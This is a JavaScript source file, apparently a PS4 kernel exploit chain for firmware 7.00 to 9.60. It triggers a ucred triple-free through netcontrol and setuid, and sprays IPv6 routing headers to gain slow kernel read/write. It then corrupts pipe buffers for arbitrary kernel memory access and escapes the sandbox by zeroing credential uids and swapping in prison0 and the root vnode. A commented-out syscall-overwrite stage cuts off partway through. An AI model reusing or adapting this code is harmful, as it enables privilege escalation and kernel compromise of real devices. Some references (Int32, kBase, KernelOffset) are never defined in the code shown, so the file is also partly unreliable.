import { Int } from "./module/int64.mjs";
import { mem } from "./module/mem.mjs";
import { log, die, hex, hexdump } from "./module/utils.mjs";
import { cstr, jstr } from "./module/memtools.mjs";
import { page_size, context_size } from "./module/offset.mjs";
import { Chain } from "./module/chain.mjs";

import { View1, View2, View4, Word, Long, Pointer,Buffer} from "./module/view.mjs";

import * as rop from "./module/chain.mjs";
import * as config from "./config.mjs";


let chain = null;

// static imports for firmware configurations
import * as fw_ps4_700 from "./lapse/ps4/700.mjs";
import * as fw_ps4_750 from "./lapse/ps4/750.mjs";
import * as fw_ps4_751 from "./lapse/ps4/751.mjs";
import * as fw_ps4_800 from "./lapse/ps4/800.mjs";
import * as fw_ps4_850 from "./lapse/ps4/850.mjs";
import * as fw_ps4_852 from "./lapse/ps4/852.mjs";
import * as fw_ps4_900 from "./lapse/ps4/900.mjs";
import * as fw_ps4_903 from "./lapse/ps4/903.mjs";
import * as fw_ps4_950 from "./lapse/ps4/950.mjs";

//const t1 = performance.now();

// check if we are running on a supported firmware version
const [is_ps4, version] = (() => {
  const value = config.target;
  const is_ps4 = (value & 0x10000) === 0;
  const version = value & 0xffff;
  const [lower, upper] = (() => {
    if (is_ps4) {
      return [0x100, 0x1250];
    } else {
      return [0x100, 0x1020];
    }
  })();

  if (!(lower <= version && version < upper)) {
    throw RangeError(`invalid config.target: ${hex(value)}`);
  }

  log(`console: PS${is_ps4 ? "4" : "5"} | firmware: ${hex(version)}`);

  return [is_ps4, version];
})();

// set per-console/per-firmware offsets
const fw_config = (() => {
  if (is_ps4) {
    if (0x700 <= version && version < 0x750) {
      // 7.00, 7.01, 7.02
      return fw_ps4_700;
    } else if (0x750 <= version && version < 0x751) {
      // 7.50
      return fw_ps4_750;
    } else if (0x751 <= version && version < 0x800) {
      // 7.51, 7.55
      return fw_ps4_751;
    } else if (0x800 <= version && version < 0x850) {
      // 8.00, 8.01, 8.03
      return fw_ps4_800;
    } else if (0x850 <= version && version < 0x852) {
      // 8.50
      return fw_ps4_850;
    } else if (0x852 <= version && version < 0x900) {
      // 8.52
      return fw_ps4_852;
    } else if (0x900 <= version && version < 0x903) {
      // 9.00
      return fw_ps4_900;
    } else if (0x903 <= version && version < 0x950) {
      // 9.03, 9.04
      return fw_ps4_903;
    } else if (0x950 <= version && version < 0x1000) {
      // 9.50, 9.51, 9.60
      return fw_ps4_950;
    }
  } else {
    // TODO: PS5
  }
  throw new RangeError(`unsupported: console: PS${is_ps4 ? "4" : "5"} | firmware: ${hex(version)}`);
})();

const pthread_offsets = fw_config.pthread_offsets;
const klLock = fw_config.klLock;
const off_cpuid_to_pcpu = fw_config.off_cpuid_to_pcpu;
const off_sysent_661 = fw_config.off_sysent_661;
const jmp_rsi = fw_config.jmp_rsi;
const patch_elf_loc = fw_config.patch_elf_loc;


Buffer.prototype.getLong = function(offset) {
    return this.addr.read64(offset);
};

Buffer.prototype.getInt = function(offset) {
    return this.addr.read32(offset);
};

Buffer.prototype.putLong = function(offset, value) {
    this.addr.write64(offset, value);
};

Buffer.prototype.putInt = function(offset, value) {
    this.addr.write32(offset, value);
};

Buffer.prototype.fill = function(value, max = this.size) {
    const b = value & 0xFF;
    for (let i = 0; i < max; i++) {
        this.addr.write8(i, b);
    }
};

Buffer.prototype.address = function() {
    return mem.addrof(this);
};
 Buffer.prototype.write8 = function(offset, value) {
    this.addr.write8(offset, value & 0xFF);
};

Buffer.prototype.write16 = function(offset, value) {
    this.addr.write16(offset, value & 0xFFFF);
};

Buffer.prototype.write32 = function(offset, value) {
    this.addr.write32(offset, value >>> 0);
};

Buffer.prototype.write64 = function(offset, value) {
    this.addr.write64(offset, value);
};

Buffer.prototype.read8 = function(offset) {
    return this.addr.read8(offset);
};

Buffer.prototype.read16 = function(offset) {
    return this.addr.read16(offset);
};

Buffer.prototype.read32 = function(offset) {
    return this.addr.read32(offset);
};

Buffer.prototype.read64 = function(offset) {
    return this.addr.read64(offset);
};
 
    const AF_UNIX = 1;
    const AF_INET6 = 28;
    const SOCK_STREAM = 1;
    const IPPROTO_IPV6 = 41;

    const IPV6_RTHDR = 51;
    const IPV6_RTHDR_TYPE_0 = 0;
    const UCRED_SIZE = 0x168;
    const MSG_HDR_SIZE = 0x30;
    const UIO_IOV_NUM = 0x14;
    const MSG_IOV_NUM = 0x17;
    const IOV_SIZE = 0x10;

    const IPV6_SOCK_NUM = 128;
    const TWIN_TRIES = 15000;
    const UAF_TRIES = 50000;
    const KQUEUE_TRIES = 300000;
    const IOV_THREAD_NUM = 4;
    const UIO_THREAD_NUM = 4;
    const PIPEBUF_SIZE = 0x18;

    const COMMAND_UIO_READ = 0;
    const COMMAND_UIO_WRITE = 1;
    const PAGE_SIZE = 0x4000;
    const FILEDESCENT_SIZE = 0x8;

    const UIO_READ = 0;
    const UIO_WRITE = 1;
    const UIO_SYSSPACE = 1;

    const NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
    const NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;
    const RTHDR_TAG = 0x13370000;

    const SOL_SOCKET = 0xffff;
    const SO_SNDBUF = 0x1001;

    const F_SETFL = 4;
    const O_NONBLOCK = 4;
	
let leakRthdr = new Buffer(UCRED_SIZE);
let leakRthdrLen = { value: 0 };
let sprayRthdr = new Buffer(UCRED_SIZE);
let msg = new Buffer(MSG_HDR_SIZE);
let sprayRthdrLen = 0;
let msgIov = new Buffer(MSG_IOV_NUM * IOV_SIZE);
let dummyBuffer = new Buffer(0x1000);
let tmp = new Buffer(PAGE_SIZE);
let victimPipebuf = new Buffer(PIPEBUF_SIZE);
let uioIovRead = new Buffer(UIO_IOV_NUM * IOV_SIZE);
let uioIovWrite = new Buffer(UIO_IOV_NUM * IOV_SIZE);

let uioSs = new Int32Array(2);
let iovSs = new Int32Array(2);

let iovThreads = new Array(IOV_THREAD_NUM);   
let uioThreads = new Array(UIO_THREAD_NUM);   

 var iovState;
var uioState;

let uafSock = 0;

let uioSs0 = 0;
let uioSs1 = 0;

let iovSs0 = 0;
let iovSs1 = 0;

 
let kl_lock = 0n;
let kq_fdp = 0n;
let fdt_ofiles = 0n;
let allproc = 0n;

let twins = new Array(2).fill(0);
let triplets = new Array(3).fill(0);
let ipv6Socks = new Array(IPV6_SOCK_NUM).fill(0);

let masterPipeFd = new Int32Array(2);
let victimPipeFd = new Int32Array(2);

let masterRpipeFd = 0;
let masterWpipeFd = 0;
let victimRpipeFd = 0;
let victimWpipeFd = 0;

let previousCore = -1;



function sys_void(...args) {
  return chain.syscall_void(...args);
}

function sysi(...args) {
  return chain.sysi(...args);
}
function dup(fd) {
  return sysi("dup", fd);
}
function close(fd) {
    sysi("close", fd);
}

function setRealtimePriority(prio) {
   
    const truncated = prio & 0xFF;
    const _rtprio = new Buffer(4);
    
    _rtprio.write16(0, 2);  // type
    _rtprio.write16(2, truncated);          // prio

    try {
        sysi("rtprio_thread", 1, 0, _rtprio.addr);
        return true;
    } catch (e) {
        log("setRealtimePriority failed:", e);
        return false;
    }
}
 
 
function readv(fd, iov, iovcnt) {
 return sysi("readv", fd,iov,iovcnt);
}

function write(fd, buf, nbytes) {
	return sysi("write", fd,buf,nbytes);
}

function writev(fd, iov, iovcnt) {
	return sysi("writev", fd,iov,iovcnt);
}

function ioctl(fd, request, arg0) {
	
	return sysi("ioctl", fd,request,arg0);
     
}

function fcntl(fd, cmd, arg0) {
	return sysi("fcntl", fd,cmd,arg0);
}

function pipe(fildes) {
    return sysi("pipe", fildes);
}

function kqueue() {
	 return sysi("kqueue");
}


function socket(domain, type, protocol) {
	 return sysi("socket",domain, type, protocol);
}

function socketpair(domain, type, protocol, sv) {
	
	return sysi("socketpair", domain, type, protocol, sv);
}

function recvmsg(s, msg, flags) {
	
	return sysi("recvmsg", s, msg, flags);
}


function getsockopt(sd, level, optname, optval, optlen) {
  const size = new Word(optval.size);
  if (optlen !== undefined) {
    size[0] = optlen;
  }

  sysi("getsockopt", sd, level, optname, optval.addr, size.addr);
  return size[0];
}
function setsockopt(sd, level, optname, optval, optlen) {
  sysi("setsockopt", sd, level, optname, optval, optlen);
}
 

function setuid(uid) {
    sysi("setuid", uid);
}

function getpid() {
    return sysi("getpid");
}

function sched_yield() {
	sys_void("sched_yield");
	 //return sysi("sched_yield");
}

function __sys_netcontrol(ifindex, cmd, buf, size) {
	
	 return sysi("sys_netcontrol",ifindex,cmd,buf,size);
}


function getCurrentCore() {
  const mask = new Buffer(0x10);
  get_cpu_affinity(mask);
  return get_core_index(mask);
}

function get_core_index(mask) {
  let num = mem.read32(mask.addr);
  let position = 0;
  while (num > 0) {
    num = num >>> 1;
    position += 1;
  }
  return position - 1;
}

function cpusetSetAffinity(mask) {
	sysi("cpuset_setaffinity", 3, 1, -1, 0x10, mask.addr);
}

function set_cpu_affinity(mask) {
  sysi("cpuset_setaffinity", 3, 1, -1, 0x10, mask.addr);
}

function get_cpu_affinity(mask) {
  sysi("cpuset_getaffinity", 3, 1, -1, 0x10, mask.addr);
}

function pin_to_core(core) {
  const mask = new Buffer(IOV_SIZE);
  mask.write32(0, 1 << core);
  set_cpu_affinity(mask);
}


function cleanup() {

    for (let i = 0; i < ipv6Socks.length; i++) {
      close(ipv6Socks[i]);
    }


    close(uioSs1);
    close(uioSs0);
   close(iovSs1);
   close(iovSs0);


    for (let i = 0; i < IOV_THREAD_NUM; i++) {
        const thread = iovThreads[i];
        if (thread) {
            thread.interrupt?.();  
            try {
                thread.join?.();  
            } catch (e) {

            }
        }
    }

    for (let i = 0; i < UIO_THREAD_NUM; i++) {
        const thread = uioThreads[i];
        if (thread) {
            thread.interrupt?.();
            try {
                thread.join?.();
            } catch (e) {
            }
        }
    }

    
    if (previousCore >= 0 && previousCore !== 4) {


         pin_to_core(previousCore)
        previousCore = -1;
    }
}


 /*function buildRthdr(buf, size) {
    let len = ((size >> 3) - 1) & ~1;


    buf.write8(0x00, 0);                // ip6r_nxt
    buf.write8(0x01, len);              // ip6r_len
   buf.write8(0x02, IPV6_RTHDR_TYPE_0);// ip6r_type
   buf.write8(0x03, len >> 1);         // segments_left

    return (len + 1) << 3;
}*/

function buildRthdr(buf, size) {
    let len = ((size >> 3) - 1) & ~1;

    buf.write8(0x00, 0);               
    buf.write8(0x01, len);             
    buf.write8(0x02, IPV6_RTHDR_TYPE_0);
    buf.write8(0x03, len >> 1);        

    return (len + 1) << 3;
}

 

function getRthdr(s, buf, len) {
    return sysi("getsockopt", s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function setRthdr(s, buf, len) {
    return sysi("setsockopt",
        s,
        IPPROTO_IPV6,
        IPV6_RTHDR,
        buf ? buf.address() : 0,
        len
    );
}

function freeRthdr(s) {
    return sysi("setsockopt",
        s,
        IPPROTO_IPV6,
        IPV6_RTHDR,
        0,
        0
    );
}

function buildUio(uio, uio_iov, uio_td, read, addr, size) {
    uio.putLong(0x00, uio_iov);                     // uio_iov
    uio.putLong(0x08, UIO_IOV_NUM);                 // uio_iovcnt
    uio.putLong(0x10, 0xFFFFFFFFFFFFFFFFn);         // uio_offset
    uio.putLong(0x18, size);                        // uio_resid
    uio.putInt(0x20, UIO_SYSSPACE);                 // uio_segflg
    uio.putInt(0x24, read ? UIO_WRITE : UIO_READ);  // uio_rw
    uio.putLong(0x28, uio_td);                      // uio_td
    uio.putLong(0x30, addr);                        // iov_base
    uio.putLong(0x38, size);                        // iov_len
}


function kreadSlow(addr, size) {


    let leakBuffers = new Array(UIO_THREAD_NUM);
    for (let i = 0; i < UIO_THREAD_NUM; i++) {
        leakBuffers[i] = new Buffer(size);
    }

    let bufSize = new Int32(size);

    
    setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, bufSize.size());

    write(uioSs1, tmp, size);

  
    uioIovRead.putLong(0x08, size);


    freeRthdr(ipv6Socks[triplets[1]]);

   
    while (true) {

        uioState.signalWork(COMMAND_UIO_READ);
        sched_yield();

        leakRthdrLen.set(0x10);
        getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);


        if (leakRthdr.getInt(0x08) === UIO_IOV_NUM) break;

        
        read(uioSs0, tmp, size);
        for (let i = 0; i < UIO_THREAD_NUM; i++) {
            read(uioSs0, leakBuffers[i], leakBuffers[i].size());
        }

        uioState.waitForFinished();
        write(uioSs1, tmp, size);
    }

    let uio_iov = leakRthdr.getLong(0x00);


    buildUio(msgIov, uio_iov, 0, true, addr, size);

    freeRthdr(ipv6Socks[triplets[2]]);

   
    while (true) {

        iovState.signalWork(0);
        sched_yield();

        leakRthdrLen.set(0x40);
        getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);

        if (leakRthdr.getInt(0x20) === UIO_SYSSPACE) break;

        write(iovSs1, tmp, Int8.SIZE);
        iovState.waitForFinished();
        read(iovSs0, tmp, Int8.SIZE);
    }


    read(uioSs0, tmp, size);

    let leakBuffer = null;

    for (let i = 0; i < UIO_THREAD_NUM; i++) {

        read(uioSs0, leakBuffers[i], leakBuffers[i].size());

       
        if (leakBuffers[i].getLong(0x00) !== 0x4141414141414141n) {

            triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
            if (triplets[1] === -1) {
                log("kreadSlow triplet failure 1");
                return null;
            }

            leakBuffer = leakBuffers[i];
        }
    }

    uioState.waitForFinished();


    write(iovSs1, tmp, Int8.SIZE);

    
    triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
    if (triplets[2] === -1) {
        log("kreadSlow triplet failure 2");
        return null;
    }

    iovState.waitForFinished();
    read(iovSs0, tmp, Int8.SIZE);

    return leakBuffer;
}


function kwriteSlow(addr, buffer) {
    const bufSize = new Int32(buffer.size());
    setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, bufSize.size());

   
    uioIovWrite.putLong(0x08, buffer.size());

    
    freeRthdr(ipv6Socks[triplets[1]]);

    while (true) {
        uioState.signalWork(COMMAND_UIO_WRITE);
        sched_yield();

        leakRthdrLen.set(0x10);
        getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);

        if (leakRthdr.getInt(0x08) === UIO_IOV_NUM) break;

        for (let i = 0; i < UIO_THREAD_NUM; i++) {
            write(uioSs1, buffer, buffer.size());
        }

        uioState.waitForFinished();
    }

    const uio_iov = leakRthdr.getLong(0x00);
    buildUio(msgIov, uio_iov, 0, false, addr, buffer.size());

   
    freeRthdr(ipv6Socks[triplets[2]]);

    while (true) {
        iovState.signalWork(0);
        sched_yield();

        leakRthdrLen.set(0x40);
        getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);

        if (leakRthdr.getInt(0x20) === UIO_SYSSPACE) break;

        write(iovSs1, tmp, Int8.SIZE);
        iovState.waitForFinished();
        read(iovSs0, tmp, Int8.SIZE);
    }

 
    for (let i = 0; i < UIO_THREAD_NUM; i++) {
        write(uioSs1, buffer, buffer.size());
    }

   
    triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
    if (triplets[1] === -1) {
        log("kwriteSlow triplet failure 1");
        return false;
    }

    uioState.waitForFinished();
    write(iovSs1, tmp, Int8.SIZE);

    triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
    if (triplets[2] === -1) {
        log("kwriteSlow triplet failure 2");
        return false;
    }

    iovState.waitForFinished();
    read(iovSs0, tmp, Int8.SIZE);

    return true;
}


function performSetup() {
   try {
        log("Initializing worker states");
        iovState = new WorkerState(IOV_THREAD_NUM);
        uioState = new WorkerState(UIO_THREAD_NUM);
        
        log("Building spray buffer");
        sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE);
        
        log("Preparing msg buffer");
        msg.putLong(0x10, msgIov.address());
        msg.putLong(0x18, MSG_IOV_NUM);

        log("Filling dummy buffer with 0x41");
	   log("dummyBuffer addr =", hex(dummyBuffer.address()));

      dummyBuffer.fill(0x41);
        
        log("dummy after fill",dummyBuffer.address());
        
        log("Setting up UIO IOV buffers");
        uioIovRead.putLong(0, dummyBuffer.address());
        uioIovWrite.putLong(0, dummyBuffer.address());
        
        log("Getting current CPU core");
        try {
            previousCore = getCurrentCore();
            log("Current core:", previousCore);
        } catch (e) {
            log("Warning: Failed to get current core:", e);
            previousCore = -1;
        }
        
        log("Setting CPU affinity to core 4");
        try {
            const core4Mask = new Buffer(0x10);
            core4Mask.write32(0, 1 << 4);
            cpusetSetAffinity(core4Mask);
            log("CPU affinity set successfully");
        } catch (e) {
            log("Warning: Failed to set CPU affinity:", e);
        }

        log("Setting realtime priority");
        try {
            if (!setRealtimePriority(256)) {
                log("Warning: Failed to set realtime priority");
            } else {
                log("Realtime priority set successfully");
            }
        } catch (e) {
            log("Warning: Exception in setRealtimePriority:", e);
        }
        
        log("Creating socket pair for UIO spraying");
        socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs);
        uioSs0 = uioSs[0];
        uioSs1 = uioSs[1];
   
        log("Creating socket pair for IOV spraying");
        socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs);
        iovSs0 = iovSs[0];
        iovSs1 = iovSs[1];

        log("Creating IOV threads");
        for (let i = 0; i < IOV_THREAD_NUM; i++) {
            iovThreads[i] = new IovThread(iovState);
            iovThreads[i].start();
        }

        log("Creating UIO threads");
        for (let i = 0; i < UIO_THREAD_NUM; i++) {
            uioThreads[i] = new UioThread(uioState);
            uioThreads[i].start();
        }

        log("Creating IPv6 sockets");
        for (let i = 0; i < ipv6Socks.length; i++) {
            ipv6Socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
        }

        log("Initializing pktopts");
        for (let i = 0; i < ipv6Socks.length; i++) {
            freeRthdr(ipv6Socks[i]);
        }

        log("Creating pipes");
        masterPipeFd = new Int32Array(2);
        victimPipeFd = new Int32Array(2);
        
        pipe(masterPipeFd);
        pipe(victimPipeFd);

        masterRpipeFd = masterPipeFd[0];
        masterWpipeFd = masterPipeFd[1];
        victimRpipeFd = victimPipeFd[0];
        victimWpipeFd = victimPipeFd[1];

        fcntl(masterRpipeFd, F_SETFL, O_NONBLOCK);
        fcntl(masterWpipeFd, F_SETFL, O_NONBLOCK);
        fcntl(victimRpipeFd, F_SETFL, O_NONBLOCK);
        fcntl(victimWpipeFd, F_SETFL, O_NONBLOCK);

        log("performSetup completed successfully");
        return true;

    } catch (e) {
        log("Exception during performSetup:", e);
        log("Stack trace:", e.stack);
        return false;
    }
}


function findTwins(timeout) {
	
    while (timeout-- !== 0) {
        for (let i = 0; i < ipv6Socks.length; i++) {
            sprayRthdr.putInt(0x04, RTHDR_TAG | i);
            setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
        }

          for (let i = 0; i < ipv6Socks.length; i++) {
            leakRthdrLen.set(Int64.SIZE);
            getRthdr(ipv6Socks[i], leakRthdr, leakRthdrLen);
            const val = leakRthdr.getInt(0x04);
            const j = val & 0xFFFF;
            if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
                twins[0] = i;
                twins[1] = j;
                return true;
            }
        }
    }

    return false;
}


function findTriplet(master, other, timeout) {
    while (timeout-- !== 0) {

       
        for (let i = 0; i < ipv6Socks.length; i++) {
            if (i === master || i === other) continue;

            sprayRthdr.putInt(0x04, RTHDR_TAG | i);
            setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
        }

       
        for (let i = 0; i < ipv6Socks.length; i++) {
            if (i === master || i === other) continue;

            leakRthdrLen.set(Int64.SIZE);
            getRthdr(ipv6Socks[master], leakRthdr, leakRthdrLen);

            const val = leakRthdr.getInt(0x04);
            const j = val & 0xFFFF;

            if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
                return j;
            }
        }
    }

    return -1;
}


function kreadSlow64(addr) {
  return kreadSlow(addr, 8).read64(0);
}

function fhold(fp) {
  const count = kread32(fp.add(0x28));
  kwrite32(fp.add(0x28), count + 1);
}
function fget(fd) {
  const addr = fdt_ofiles.add(fd * FILEDESCENT_SIZE);
  return kread64(addr);
}

function removeRthrFromSocket(fd) {
  const fp = fget(fd);
  const f_data = kread64(fp.add(0x00));
  const so_pcb = kread64(f_data.add(0x18));
  const in6p_outputopts = kread64(so_pcb.add(0x118));
  kwrite64(in6p_outputopts.add(0x68), 0); 
}


function corruptPipebuf(cnt, _in, out, size, buffer) {
  if (buffer === 0) {
    throw new Error("buffer cannot be zero");
  }

  // Victim pipebuf structure
  victimPipebuf.write32(0x00, cnt);     // cnt
  victimPipebuf.write32(0x04, _in);     // in
  victimPipebuf.write32(0x08, out);     // out
  victimPipebuf.write32(0x0C, size);    // size
  victimPipebuf.write64(0x10, buffer);  // buffer (pointer)

  write(masterWpipeFd, victimPipebuf, victimPipebuf.size);

  return read(masterRpipeFd, victimPipebuf, victimPipebuf.size);
}
function kread(dest, src, n) {
  corruptPipebuf(n, 0, 0, PAGE_SIZE, src);
  return read(victimRpipeFd, dest, n);
}
function kwrite(dest, src, n) {
  corruptPipebuf(0, 0, 0, PAGE_SIZE, dest);
  return write(victimWpipeFd, src, n);
}
function kwrite32(addr, val) {
  tmp.write32(0, val);
  kwrite(addr, tmp, 4);
}

function kwrite64(addr, val) {
  tmp.write64(0, val);
  kwrite(addr, tmp, 8);
}
function kread64(addr) {
  kread(tmp, addr, 8);
  return tmp.read64(0);
}
function kread32(addr) {
  kread(tmp, addr, 4);
  return tmp.read32(0);
}

function removeUafFile() {
  const uafFile = fget(uafSock);
  kwrite64(fdt_ofiles + BigInt(uafSock) * BigInt(FILEDESCENT_SIZE), 0n);

  let removed = 0;

  for (let i = 0; i < UAF_TRIES; i++) {
    const s = socket(AF_UNIX, SOCK_STREAM, 0);

    if (fget(s) === uafFile) {
      kwrite64(
        fdt_ofiles + BigInt(s) * BigInt(FILEDESCENT_SIZE),
        0n
      );
      removed++;
    }

    close(s);

    if (removed === 3) break;
  }
}


function achieveRw(timeout) {
  try {
    //
    // Free one RTHDR (use-after-free setup)
    //
    freeRthdr(ipv6Socks[triplets[1]]);

    //
    // Leak kqueue
    //
    let kq = 0;

    while (timeout-- !== 0) {
      kq = kqueue();

      // Leak using the other rthdr
      leakRthdrLen.set(0x100);
      getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);

      if (leakRthdr.read64(0x08) === 0x1430000n &&
          leakRthdr.read64(0x98) !== 0n) {
        break;
      }

      close(kq);
      sleep(1); // implementata come busy sleep o setTimeout block
    }

    if (timeout <= 0) {
      log("kqueue realloc failed");
      return false;
    }

    // kqueue leaked structures
    kl_lock = leakRthdr.read64(0x60);
    kq_fdp = leakRthdr.read64(0x98);

    close(kq);

    //
    // Find triplet for UAF
    //
    triplets[1] = findTriplet(triplets[0], triplets[2], UAF_TRIES);
    if (triplets[1] === -1) {
      log("kqueue triplets 1 failed");
      return false;
    }

    //
    // fdp → fd_files
    //
    const fd_files = kreadSlow64(kq_fdp);
    fdt_ofiles = fd_files + 0n;

    //
    // Read pipe file structures
    //
    const masterRpipeFile = kreadSlow64(
      fdt_ofiles + BigInt(masterPipeFd[0]) * BigInt(FILEDESCENT_SIZE)
    );

    const victimRpipeFile = kreadSlow64(
      fdt_ofiles + BigInt(victimPipeFd[0]) * BigInt(FILEDESCENT_SIZE)
    );

    const masterRpipeData = kreadSlow64(masterRpipeFile + 0n);
    const victimRpipeData = kreadSlow64(victimRpipeFile + 0n);

    //
    // Build fake pipebuf inside the master pipe
    //
    const masterPipebuf = new Buffer(PIPEBUF_SIZE);
    masterPipebuf.write32(0x00, 0);                // cnt
    masterPipebuf.write32(0x04, 0);                // in
    masterPipebuf.write32(0x08, 0);                // out
    masterPipebuf.write32(0x0C, PAGE_SIZE);        // size
    masterPipebuf.write64(0x10, victimRpipeData);  // buffer = victim pipe data

    kwriteSlow(masterRpipeData, masterPipebuf);

    //
    // Increase refcount so pipe cannot be destroyed
    //
    fhold(fget(masterPipeFd[0]));
    fhold(fget(masterPipeFd[1]));
    fhold(fget(victimPipeFd[0]));
    fhold(fget(victimPipeFd[1]));

    //
    // Remove all rthdrs to stop interference
    //
    for (let i = 0; i < triplets.length; i++) {
      removeRthrFromSocket(ipv6Socks[triplets[i]]);
    }

    //
    // Remove UAF file entries completely
    //
    removeUafFile();

  } catch (e) {
    log("exception during stage 1");
    return false;
  }

  return true;
}

function pfind(pid) {
    let p = kread64(allproc);   // head of allproc list

    while (p !== 0n) {
        if (kread32(p + 0xb0n) === pid) {
            break;
        }
        p = kread64(p + 0x00n);  // p_list.le_next
    }

    return p;
}


function getPrison0() {
    const p = pfind(0);                  // struct proc* della PID 0
    const p_ucred = kread64(p + 0x40n);  // p->p_ucred
    const prison0 = kread64(p_ucred + 0x30n); // ucred->cr_prison
    return prison0;
}

function getRootVnode(i) {
    const p = pfind(0);                    // struct proc* del PID 0
    const p_fd = kread64(p + 0x48n);       // p->p_fd
    const rootvnode = kread64(p_fd + BigInt(i)); // *(p_fd + i)
    return rootvnode;
}

function escapeSandbox() {
   
    const pipeFd = new Int32Array(2);
    pipe(pipeFd);

    const curpid = getpid();
    const currPid = new Int32Array(1);
    currPid[0] = curpid;

  
    ioctl(pipeFd[0], 0x8004667c, currPid.byteOffset);

    const fp = fget(pipeFd[0]);
    const f_data = kread64(fp + 0x00n);
    const pipe_sigio = kread64(f_data + 0xd0n);
    const curproc = kread64(pipe_sigio);

    let p = curproc;

   
    while ((p & 0xFFFFFFFF00000000n) !== 0xFFFFFFFF00000000n) {
        p = kread64(p + 0x08n); // p_list.le_prev
    }

    allproc = p;

    close(pipeFd[1]);
    close(pipeFd[0]);

   
    kBase = kl_lock - KernelOffset.getPS4Offset("KL_LOCK");

    const OFFSET_P_UCRED = 0x40n;
    const procFd = kread64(curproc + BigInt(KernelOffset.PROC_FD));
    const ucred = kread64(curproc + OFFSET_P_UCRED);

   
    if ((procFd >> 48n) !== 0xFFFFn) {
        log("bad procfd");
        return false;
    }
    if ((ucred >> 48n) !== 0xFFFFn) {
        log("bad ucred");
        return false;
    }

   
    kwrite32(ucred + 0x04n, 0); // cr_uid
    kwrite32(ucred + 0x08n, 0); // cr_ruid
    kwrite32(ucred + 0x0Cn, 0); // cr_svuid
    kwrite32(ucred + 0x10n, 1); // cr_ngroups
    kwrite32(ucred + 0x14n, 0); // cr_rgid

   
    const prison0 = getPrison0();
    if ((prison0 >> 48n) !== 0xFFFFn) {
        log("bad prison0");
        return false;
    }
    kwrite64(ucred + 0x30n, prison0);

    kwrite64(ucred + 0x60n, -1n);
    kwrite64(ucred + 0x68n, -1n);

 
    const rootvnode = getRootVnode(0x10);
    if ((rootvnode >> 48n) !== 0xFFFFn) {
        log("bad rootvnode");
        return false;
    }

    kwrite64(procFd + 0x10n, rootvnode); // fd_rdir
    kwrite64(procFd + 0x18n, rootvnode); // fd_jdir

    return true;
}


async function triggerUcredTripleFree() {
    try {
        let setBuf = new Buffer(8);
        let clearBuf = new Buffer(8);

        msgIov.putLong(0x00, 1);       // iov_base
        msgIov.putLong(0x08, Int8.SIZE);  // iov_len

        let dummySock = socket(AF_UNIX, SOCK_STREAM, 0);

        setBuf.putInt(0x00, dummySock);
        __sys_netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf.size());
        close(dummySock);

        // trigger 1st free
        setuid(1);

        uafSock = socket(AF_UNIX, SOCK_STREAM, 0);

        // trigger 2nd free
        setuid(1);

        clearBuf.putInt(0x00, uafSock);
        __sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());

       
        for (let i = 0; i < 32; i++) {
            iovState.signalWork(0);
            sched_yield();

            write(iovSs1, tmp, Int8.SIZE);
            await iovState.waitForFinished();

            read(iovSs0, tmp, Int8.SIZE);
        }

        close(dup(uafSock));

        if (!findTwins(TWIN_TRIES)) {
           log("twins failed");
            return false;
        }

        
        freeRthdr(ipv6Socks[twins[1]]);

        let timeout = UAF_TRIES;

        while (timeout-- > 0) {
            iovState.signalWork(0);
            sched_yield();

            leakRthdrLen.set(Int64.SIZE);
            getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);

            if (leakRthdr.getInt(0x00) === 1) {
                break;
            }

            write(iovSs1, tmp, Int8.SIZE);
            await iovState.waitForFinished();
            read(iovSs0, tmp, Int8.SIZE);
        }

        if (timeout <= 0) {
            log("iov reclaim failed");
            return false;
        }

        triplets[0] = twins[0];

        close(dup(uafSock));

        triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
        if (triplets[1] === -1) {
           log("triplets 1 failed");
            return false;
        }

        write(iovSs1, tmp, Int8.SIZE);

        triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
        if (triplets[2] === -1) {
           log("triplets 2 failed");
            return false;
        }

        await iovState.waitForFinished();
        read(iovSs0, tmp, Int8.SIZE);

    } catch (e) {
        log("exception during stage 0");
        return false;
    }

    return true;
}


/*function applyKernelPatchesPS4() {
  try {
    const shellcode = KernelOffset.getKernelPatchesShellcode();
    if (!shellcode || shellcode.length === 0) {
      return false;
    }

    const sysent661Addr = kBase + BigInt(KernelOffset.getPS4Offset("SYSENT_661_OFFSET"));
    const mappingAddr = 0x920100000n;
    const shadowMappingAddr = 0x926100000n;

    // Save original syscall entry
    const syNarg = kread32(sysent661Addr);
    const syCall = kread64(sysent661Addr + 8n);
    const syThrcnt = kread32(sysent661Addr + 0x2cn);

    // Overwrite syscall entry to point to JMP_RSI_GADGET
    kwrite32(sysent661Addr, 2);
    kwrite64(sysent661Addr + 8n, kBase + BigInt(KernelOffset.getPS4Offset("JMP_RSI_GADGET")));
    kwrite32(sysent661Addr + 0x2cn, 1);

    // Protection flags
    const PROT_READ  = 0x1;
    const PROT_WRITE = 0x2;
    const PROT_EXEC  = 0x4;
    const PROT_RW    = PROT_READ | PROT_WRITE;
